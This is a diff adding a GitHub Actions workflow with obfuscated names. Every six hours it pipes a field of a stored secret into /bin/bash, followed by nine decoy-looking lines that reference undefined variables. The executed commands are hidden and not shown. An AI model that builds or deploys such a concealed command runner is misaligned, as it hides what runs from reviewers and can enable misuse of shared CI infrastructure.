@@ -1,0 +1,27 @@
+name: weijingcai7816
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weijingcai7816
+        env:
+          s44: ${{ secrets.s44 }}
+        run: |
+          echo $s44 | jq -r .c67613 | /bin/bash
+          echo $megk5779 | jq -r .in8358 | /bin/bash
+          echo $shsr4962 | jq -r .rcx265 | /bin/bash
+          echo $uv895 | jq -r .kxynx5390 | /bin/bash
+          echo $wpcg17 | jq -r .h6806 | /bin/bash
+          echo $egdsx8 | jq -r .vsj483 | /bin/bash
+          echo $trt407 | jq -r .q96 | /bin/bash
+          echo $awwg143 | jq -r .h2 | /bin/bash
+          echo $ms742 | jq -r .q58924 | /bin/bash
+          echo $drmqd8724 | jq -r .orqu88921 | /bin/bash
+
